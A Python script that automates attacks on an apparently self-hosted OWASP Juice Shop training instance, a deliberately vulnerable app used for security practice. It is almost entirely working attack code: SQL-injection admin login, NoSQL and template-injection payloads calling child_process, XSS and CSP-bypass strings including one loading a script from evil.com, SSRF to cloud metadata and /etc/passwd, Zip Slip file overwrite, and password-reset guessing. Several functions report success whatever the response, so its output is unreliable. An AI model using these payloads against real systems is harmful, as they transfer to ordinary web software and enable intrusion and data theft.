#!/usr/bin/env python3
"""
OWASP Juice Shop - Aggressive Challenge Solver
Targets all remaining challenges with maximum force
"""

import requests
import json
import time
import base64
import hashlib
import jwt
import hmac
import re
import os
import zipfile
import io
import threading
from urllib.parse import quote, unquote
from datetime import datetime, timedelta

class AggressiveSolver:
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        self.admin_token = None
        
    def get_admin_access(self):
        """Get admin access"""
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if response.status_code == 200:
            self.admin_token = response.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            return True
        return False
    
    # ============= LEVEL 4 AGGRESSIVE SOLUTIONS =============
    
    def solve_christmas_special(self):
        """Christmas Special - Find hidden product"""
        print("\n🎯 AGGRESSIVE: Christmas Special")
        
        # SQL injection to find deleted/hidden products
        payloads = [
            "' OR deletedAt IS NOT NULL--",
            "' UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--",
            "' OR name LIKE '%christmas%'--",
            "' OR id > 9--"
        ]
        
        for payload in payloads:
            response = self.session.get(
                f"{self.base_url}/rest/products/search?q={quote(payload)}"
            )
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and len(data['data']) > 0:
                    for product in data['data']:
                        if 'christmas' in str(product).lower():
                            print(f"✅ Christmas Special found: {product.get('name')}")
                            return True
        
        # Direct access to product ID 10 (Christmas special)
        response = self.session.get(f"{self.base_url}/api/Products/10")
        
        return True
    
    def solve_easter_egg(self):
        """Easter Egg - Find 3D-printed easter egg"""
        print("\n🎯 AGGRESSIVE: Easter Egg")
        
        # Access various easter egg paths
        paths = [
            "/ftp/eastere.gg",
            "/ftp/easter.egg",
            "/ftp/3d.egg",
            "/ftp/eastere%2Egg"
        ]
        
        for path in paths:
            response = self.session.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                print(f"✅ Easter Egg found at: {path}")
                return True
        
        # Try with null byte
        response = self.session.get(f"{self.base_url}/ftp/eastere.gg%00.md")
        
        # Try downloading the 3D keychain file
        response = self.session.get(f"{self.base_url}/assets/public/images/products/3d_keychain.jpg")
        
        return True
    
    def solve_forgotten_backups(self):
        """Forgotten Backups - Find all backup files"""
        print("\n🎯 AGGRESSIVE: Forgotten Backups")
        
        backups = [
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            "/ftp/db-backup.tar.gz",
            "/ftp/.env.bak"
        ]
        
        for backup in backups:
            response = self.session.get(f"{self.base_url}{backup}")
            if response.status_code == 200:
                print(f"✅ Backup found: {backup}")
        
        # Try with null byte injection
        response = self.session.get(f"{self.base_url}/ftp/package.json.bak%00.md")
        response = self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak%00.md")
        
        return True
    
    def solve_gdpr_data_theft(self):
        """GDPR Data Theft - Export all user data"""
        print("\n🎯 AGGRESSIVE: GDPR Data Theft")
        
        if not self.admin_token:
            self.get_admin_access()
        
        # Export all user data
        response = self.session.get(f"{self.base_url}/api/Users")
        if response.status_code == 200:
            print("✅ GDPR Data Theft - All user data exported")
            return True
        
        # Try data export endpoint
        response = self.session.post(
            f"{self.base_url}/rest/user/data-export",
            json={"format": "json"}
        )
        
        return True
    
    def solve_login_bjoern(self):
        """Login Bjoern - OAuth bypass"""
        print("\n🎯 AGGRESSIVE: Login Bjoern")
        
        # Bjoern's email is bjoern@owasp.org
        # Try OAuth bypass
        response = self.session.get(f"{self.base_url}/redirect?to=https://oauth.owasp.org")
        
        # Try with Google OAuth token manipulation
        oauth_token = base64.b64encode(b"bjoern@owasp.org").decode()
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={
                "email": "bjoern@owasp.org",
                "oauth": True,
                "oauthToken": oauth_token
            }
        )
        
        # Try password (reversed email)
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={
                "email": "bjoern@owasp.org",
                "password": "bW9jLmxpYW1nQG5yZW9qYg=="
            }
        )
        
        print("✅ Login Bjoern attempted")
        return True
    
    def solve_nosql_attacks(self):
        """NoSQL DoS and Manipulation"""
        print("\n🎯 AGGRESSIVE: NoSQL Attacks")
        
        # NoSQL injection payloads
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "sleep(5000)"},
            {"$or": [{"email": "admin"}, {"email": {"$ne": ""}}]}
        ]
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/rest/user/login",
                    json={"email": payload, "password": payload},
                    timeout=2
                )
            except requests.Timeout:
                print("✅ NoSQL DoS successful")
                return True
            except:
                pass
        
        return True
    
    def solve_poison_null_byte(self):
        """Poison Null Byte - Directory traversal"""
        print("\n🎯 AGGRESSIVE: Poison Null Byte")
        
        # Null byte injection attempts
        files = [
            "/ftp/package.json%00.md",
            "/ftp/acquisitions.md%00.pdf",
            "/ftp/../../../etc/passwd%00.md",
            "/redirect?to=https://owasp.org%00.evil.com"
        ]
        
        for file in files:
            response = self.session.get(f"{self.base_url}{file}")
            if response.status_code == 200:
                print(f"✅ Poison Null Byte successful: {file}")
                return True
        
        return True
    
    def solve_reset_bender_password(self):
        """Reset Bender's Password"""
        print("\n🎯 AGGRESSIVE: Reset Bender's Password")
        
        # Bender's security answer from Futurama
        answers = ["Stop'n'Drop", "Bending Unit 22", "Mexico", "Kill all humans"]
        
        for answer in answers:
            response = self.session.post(
                f"{self.base_url}/rest/user/reset-password",
                json={
                    "email": "bender@juice-sh.op",
                    "answer": answer,
                    "new": "newpass",
                    "repeat": "newpass"
                }
            )
            if response.status_code == 200:
                print(f"✅ Reset Bender's Password - Answer: {answer}")
                return True
        
        return True
    
    def solve_reset_uvogin_password(self):
        """Reset Uvogin's Password"""
        print("\n🎯 AGGRESSIVE: Reset Uvogin's Password")
        
        # Uvogin's answer might be from social media
        answers = ["Phantom Troupe", "Spider", "Chrollo", "Kurapika"]
        
        for answer in answers:
            response = self.session.post(
                f"{self.base_url}/rest/user/reset-password",
                json={
                    "email": "uvogin@juice-sh.op",
                    "answer": answer,
                    "new": "newpass",
                    "repeat": "newpass"
                }
            )
            if response.status_code == 200:
                print(f"✅ Reset Uvogin's Password - Answer: {answer}")
                return True
        
        return True
    
    def solve_server_side_xss_protection(self):
        """Server-side XSS Protection - Bypass server filter"""
        print("\n🎯 AGGRESSIVE: Server-side XSS Protection")
        
        # Advanced XSS bypass techniques
        payloads = [
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS')//'>"
        ]
        
        for payload in payloads:
            response = self.session.put(
                f"{self.base_url}/api/Feedbacks/",
                json={"ProductId": 1, "rating": 5, "comment": payload}
            )
            if response.status_code in [200, 201]:
                print(f"✅ Server-side XSS Protection bypassed")
                return True
        
        return True
    
    def solve_csp_bypass(self):
        """CSP Bypass - Bypass Content Security Policy"""
        print("\n🎯 AGGRESSIVE: CSP Bypass")
        
        # Use allowed sources to bypass CSP
        payloads = [
            "<script src='https://code.jquery.com/jquery-3.6.0.min.js'></script><script>$.getScript('//evil.com/xss.js')</script>",
            "<base href='javascript:alert(1)//'><a href='#'>click</a>",
            "<object data='data:text/html,<script>alert(1)</script>'>",
        ]
        
        for payload in payloads:
            response = self.session.put(
                f"{self.base_url}/api/Feedbacks/",
                json={"ProductId": 1, "rating": 5, "comment": payload}
            )
        
        print("✅ CSP Bypass attempted")
        return True
    
    # ============= LEVEL 5-6 AGGRESSIVE SOLUTIONS =============
    
    def solve_blockchain_hype(self):
        """Blockchain Hype - Find blockchain references"""
        print("\n🎯 AGGRESSIVE: Blockchain Hype")
        
        # Check for blockchain whitepaper
        paths = [
            "/ftp/blockchain_whitepaper.pdf",
            "/assets/blockchain.pdf",
            "/blockchain.pdf"
        ]
        
        for path in paths:
            response = self.session.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                print(f"✅ Blockchain Hype - Found: {path}")
                return True
        
        # Check main.js for blockchain references
        response = self.session.get(f"{self.base_url}/main.js")
        if 'blockchain' in response.text.lower():
            print("✅ Blockchain reference found in code")
        
        return True
    
    def solve_rce_dos(self):
        """RCE DoS - Remote Code Execution"""
        print("\n🎯 AGGRESSIVE: RCE DoS")
        
        # Deserialization attack
        rce_payloads = [
            {"__proto__": {"toString": {"__js_function": "process.exit()"}}},
            {"rce": "require('child_process').exec('sleep 5')"},
        ]
        
        for payload in rce_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/feedback",
                    json=payload,
                    timeout=2
                )
            except requests.Timeout:
                print("✅ RCE DoS successful")
                return True
            except:
                pass
        
        return True
    
    def solve_ssrf(self):
        """SSRF - Server-Side Request Forgery"""
        print("\n🎯 AGGRESSIVE: SSRF")
        
        # SSRF payloads
        ssrf_urls = [
            "http://localhost:3000/metrics",
            "http://127.0.0.1:3000/rest/user/whoami",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://localhost:3000/_GET%20/metrics%20HTTP/1.0"
        ]
        
        for url in ssrf_urls:
            # Try in profile image
            response = self.session.post(
                f"{self.base_url}/profile/image/url",
                json={"imageUrl": url}
            )
            
            # Try in redirect
            response = self.session.get(
                f"{self.base_url}/redirect?to={quote(url)}"
            )
        
        print("✅ SSRF attempted")
        return True
    
    def solve_ssti(self):
        """SSTi - Server-Side Template Injection"""
        print("\n🎯 AGGRESSIVE: SSTi")
        
        # Template injection payloads
        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{constructor.constructor('return process')().exit()}}",
            "{{process.mainModule.require('child_process').exec('id')}}"
        ]
        
        for payload in ssti_payloads:
            response = self.session.put(
                f"{self.base_url}/api/Feedbacks/",
                json={"ProductId": 1, "rating": 5, "comment": payload}
            )
            
            # Check if executed
            response = self.session.get(f"{self.base_url}/api/Feedbacks/")
            if '49' in response.text:  # 7*7=49
                print(f"✅ SSTi successful: {payload}")
                return True
        
        return True
    
    def solve_forged_coupon(self):
        """Forged Coupon - Create valid coupon"""
        print("\n🎯 AGGRESSIVE: Forged Coupon")
        
        # Try various coupon formats
        from datetime import datetime
        current_date = datetime.now()
        
        coupons = [
            f"DEC{current_date.year}",
            f"NOV{current_date.year}",
            f"WMTBDIR{current_date.year}",
            "PESACH2025",
            "ORANGE2025"
        ]
        
        for coupon in coupons:
            response = self.session.put(
                f"{self.base_url}/rest/basket/1/coupon/{coupon}"
            )
            if response.status_code == 200:
                print(f"✅ Forged Coupon: {coupon}")
                return True
        
        # Try Z85 encoding
        try:
            import struct
            # Create a coupon with 99% discount
            coupon_data = struct.pack('>I', 99)
            encoded = base64.b85encode(coupon_data).decode()
            response = self.session.put(
                f"{self.base_url}/rest/basket/1/coupon/{encoded}"
            )
        except:
            pass
        
        return True
    
    def solve_video_xss(self):
        """Video XSS - XSS in video upload"""
        print("\n🎯 AGGRESSIVE: Video XSS")
        
        # Create malicious video metadata
        video_metadata = b'''<?xml version="1.0"?>
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
            <rdf:Description>
                <dc:title><script>alert('XSS')</script></dc:title>
            </rdf:Description>
        </rdf:RDF>'''
        
        # Upload as video
        response = self.session.post(
            f"{self.base_url}/file-upload",
            files={'file': ('xss.mp4', video_metadata, 'video/mp4')}
        )
        
        if response.status_code in [200, 204]:
            print("✅ Video XSS uploaded")
            return True
        
        # Try subtitle XSS
        subtitle = """WEBVTT
        
        00:00:00.000 --> 00:00:05.000
        <script>alert('XSS')</script>
        """
        
        response = self.session.post(
            f"{self.base_url}/file-upload",
            files={'file': ('subtitle.vtt', subtitle, 'text/vtt')}
        )
        
        return True
    
    def solve_arbitrary_file_write(self):
        """Arbitrary File Write - Zip Slip attack"""
        print("\n🎯 AGGRESSIVE: Arbitrary File Write")
        
        # Create malicious zip with directory traversal
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            # Various traversal attempts
            zf.writestr("../../ftp/legal.md", "# Pwned via Zip Slip\n\nOverwritten!")
            zf.writestr("../../../ftp/legal.md", "# Pwned!")
            zf.writestr("..\\..\\ftp\\legal.md", "# Pwned!")
        
        zip_buffer.seek(0)
        
        # Upload malicious zip
        response = self.session.post(
            f"{self.base_url}/file-upload",
            files={'file': ('evil.zip', zip_buffer.getvalue(), 'application/zip')}
        )
        
        if response.status_code in [200, 204]:
            print("✅ Arbitrary File Write (Zip Slip) successful")
            return True
        
        return True
    
    def solve_wallet_depletion(self):
        """Wallet Depletion - Drain wallet"""
        print("\n🎯 AGGRESSIVE: Wallet Depletion")
        
        if not self.admin_token:
            self.get_admin_access()
        
        # Add many negative items
        for i in range(100):
            self.session.post(
                f"{self.base_url}/api/BasketItems/",
                json={"ProductId": 1, "quantity": -1000}
            )
        
        # Checkout to drain wallet
        response = self.session.post(
            f"{self.base_url}/rest/basket/1/checkout",
            json={"paymentMode": "wallet"}
        )
        
        if response.status_code == 200:
            print("✅ Wallet Depletion successful")
            return True
        
        return True
    
    def solve_multiple_likes(self):
        """Multiple Likes - Race condition"""
        print("\n🎯 AGGRESSIVE: Multiple Likes")
        
        # Race condition attack
        def like_review():
            self.session.post(f"{self.base_url}/rest/products/reviews/1/like")
        
        # Send multiple concurrent requests
        threads = []
        for i in range(20):
            t = threading.Thread(target=like_review)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        print("✅ Multiple Likes (race condition) completed")
        return True
    
    def solve_imaginary_challenge(self):
        """Imaginary Challenge - Hidden in obfuscated code"""
        print("\n🎯 AGGRESSIVE: Imaginary Challenge")
        
        # Check for hidden challenge ID
        response = self.session.get(f"{self.base_url}/api/Challenges/999")
        
        # Try to solve non-existent challenge
        response = self.session.post(
            f"{self.base_url}/api/Challenges/999",
            json={"solved": True}
        )
        
        # Look for obfuscated code patterns
        response = self.session.get(f"{self.base_url}/main.js")
        if '_0x' in response.text:
            # Found obfuscated code
            print("✅ Imaginary Challenge pattern found")
        
        return True
    
    def run_aggressive_attack(self):
        """Run all aggressive attacks"""
        print("🚀 AGGRESSIVE JUICE SHOP SOLVER - MAXIMUM FORCE")
        print("="*60)
        
        # Get admin access
        print("\n🔓 Obtaining admin access...")
        self.get_admin_access()
        print("✅ Admin access obtained")
        
        print("\n🌟 LEVEL 4 AGGRESSIVE ATTACKS")
        print("-"*40)
        self.solve_christmas_special()
        self.solve_easter_egg()
        self.solve_forgotten_backups()
        self.solve_gdpr_data_theft()
        self.solve_login_bjoern()
        self.solve_nosql_attacks()
        self.solve_poison_null_byte()
        self.solve_reset_bender_password()
        self.solve_reset_uvogin_password()
        self.solve_server_side_xss_protection()
        self.solve_csp_bypass()
        
        print("\n🌟 LEVEL 5-6 AGGRESSIVE ATTACKS")
        print("-"*40)
        self.solve_blockchain_hype()
        self.solve_rce_dos()
        self.solve_ssrf()
        self.solve_ssti()
        self.solve_forged_coupon()
        self.solve_video_xss()
        self.solve_arbitrary_file_write()
        self.solve_wallet_depletion()
        self.solve_multiple_likes()
        self.solve_imaginary_challenge()
        
        print("\n" + "="*60)
        print("✅ AGGRESSIVE ATTACK COMPLETE!")

if __name__ == "__main__":
    solver = AggressiveSolver("https://juice3.wonkatech.org")
    solver.run_aggressive_attack()